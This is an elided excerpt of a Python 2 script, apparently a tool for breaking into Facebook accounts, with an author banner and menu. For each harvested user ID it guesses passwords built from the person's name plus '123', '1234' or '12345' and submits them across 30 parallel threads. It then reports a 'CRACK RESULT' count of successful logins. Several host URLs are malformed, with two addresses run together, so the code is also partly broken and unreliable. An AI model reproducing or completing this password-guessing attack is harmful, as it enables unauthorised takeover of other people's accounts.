...
def logo():
    ...
    print '\x1b[1;91m __ NaZirO_KHaNx  ____ ___\n\x1b[1;91m| TOor AjMaLo_ \_ _|\n\x1b[1;92m| MR NaZir| |\n\x1b[1;92m| AjMaLo | |\n\x1b[1;91m|_NaZiro_|\n\x1b[1;91m\n\x1b[1;97m-------------------------------------------------'
...
def menu():
    ...
    if demon == '':
        ...
        if cek == '':
            ...
            print ' [#] ----------------------------------------------'
            print ' [+] CRACK RESULT : %s TOTAL : %s\x1b[0;93m' % (del_txt, len(totalok))
    ...
    if method == '':
            ...
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                ...
                for user in id:
                    ...
                    if len(name) >= 6:
                        ...
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    coeg.submit(crack, uid, pwx, 'https://www.facebook.com/NaZerkhaN521')
        ...
        if ask == 'y':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                ...
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu, 'https://m.facebook.comhttps://www.facebook.com/NaZerkhaN521')
            ...
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                ...
                for user in id:
                    ...
                    if len(name) >= 6:
                        ...
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    coeg.submit(crack, uid, pwx, 'https://m.facebook.comhttps://www.facebook.com/NaZerkhaN521')
...
def crack(uid, pwx, host, **kwargs):
    ...
    try:
        ...
        if 'free.facebook.com' in host:
            ...
            return crack(uid, pwx, 'https://free.facebook.comhttps://www.facebook.com/NaZerkhaN521')
